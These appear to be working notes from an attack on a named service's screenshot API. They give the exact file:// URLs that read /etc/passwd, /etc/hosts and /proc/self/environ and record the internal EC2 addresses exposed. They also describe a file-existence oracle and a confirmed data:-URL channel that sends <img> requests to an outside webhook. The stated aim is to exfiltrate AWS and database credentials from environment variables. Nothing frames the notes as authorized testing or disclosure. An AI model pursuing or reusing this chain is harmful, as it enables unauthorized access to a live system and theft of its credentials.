# Screenshot url-field — file:// scheme Local File Read (CONFIRMED, 2026-10-09)

Route: `POST /web/agents/screenshot` with `{url, theme, viewport, selectors[]}`.
The zod schema is `url: z.string()` — NO scheme validation. The SSRF guard is
DNS-resolution-based and only engages for http(s) hosts; `file:` has no hostname
to resolve and falls straight through to the headless browser's loader.

## Confirmed primitives (all from a FREE account, cookie-only auth, no Castle)
| url | result |
|---|---|
| `file:///etc/passwd` | rendered full contents (root, ubuntu, etc.) |
| `file:///etc/hosts` | rendered — **internal topology: EC2 10.1.12.187, ip-10-1-12-187.ec2.internal** |
| `file:///etc/hostname` | rendered |
| `file:///etc/os-release` | rendered |
| `file:///proc/self/environ` | content READ (renders as 8px line, null-bytes collapse layout) |
| `file:///proc/1/environ` | exists (SELECTOR_NOT_VISIBLE = exists-but-not-visible) |
| `file:///proc/self/cwd/` | renders (empty dir index) |

## Error-code oracle (file existence primitive)
- `PAGE_LOAD_FAILED` = file does not exist
- `SELECTOR_NOT_VISIBLE` = file EXISTS but content not renderable at that size
This gives a clean boolean file-existence oracle over the whole filesystem.

## Outbound channel (exfiltration vector) — CONFIRMED
A `data:` URL page in the url-field executes JS AND makes outbound subresource
requests (`<img src>`). Verified via canary (webhook.site) — request arrived
from Framer's render infra (Chrome/149 headless, AWS us-east-1 52.21.124.57).
So arbitrary file bytes can be exfiltrated if they can be read into JS.

## Open sub-problem
`fetch("file://...")` is blocked (TypeError). The read channel that works is
url-field NAVIGATION (renders text/plain but no JS on text/plain pages).
Next: XHR / iframe+DOM read / `<object>` of file:// from a data: page to get
content into JS, then exfil via <img> query string.

## Exfiltration-channel deep analysis (2026-10-09, continued)

The url-field navigation to file:// is the ONLY working read channel. All
JS-mediated reads of file:// from a data:/web origin are blocked by Chromium's
web-content file-access sandbox (sync XHR, async XHR, fetch, <iframe>,
<object>, window.open all deny — verified via canary).

Newline-separated files read CLEAN through the raster:
- /etc/passwd, /etc/hosts, /etc/hostname, /etc/os-release, /etc/resolv.conf
  (resolv: nameserver 10.1.0.2, search ec2.internal — internal AWS topology)

Null-separated proc files (environ, cmdline) read but DON'T raster legibly:
- Chromium lays out the single null-joined line; the selector box collapses to
  ~8px height (SELECTOR_NOT_VISIBLE at any viewport that doesn't match).
- view-source: wraps but renders the nulls as invisible -> blank.
- iframe/object/XHR bridges to file:// are sandbox-blocked.
- This is a RASTER/layout constraint, NOT a read constraint — the file content
  IS returned to the headless browser (the hairline is the laid-out line).

## The remaining solve (root-class: environ = AWS/DB creds on EC2)
Need ONE of:
1. A way to make Chromium wrap/reformat the null-joined line (CSS injection
   into a file:// navigation — blocked; or a scheme that re-formats).
2. A JS bridge to file:// content (sandbox-blocked from web origins).
3. An HTML file on disk that JS can run to read siblings (none found yet —
   cwd/fd/tmp probes returned empty/inaccessible).
The primitive (free-account LFI + confirmed live outbound channel from the
render pod) is genuine and durable. environ is the prize; the read works,
only the formatting blocks exfil of null-separated files specifically.
